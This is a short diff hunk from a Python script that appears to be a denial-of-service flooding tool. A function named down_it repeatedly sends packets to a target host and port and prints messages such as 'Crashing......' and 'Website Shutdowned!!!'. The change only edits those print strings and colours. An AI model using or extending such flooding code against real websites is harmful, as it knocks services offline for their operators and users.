@@ -41,13 +41,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m      Crashing......\033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m - Crashing......\033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[92mWebsite Shutdowned!!!\033[92m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[92mConnection lost!\033[92m")
+		print("\033[91mConnection lost!\033[91m")
 		time.sleep(.1)
 
 
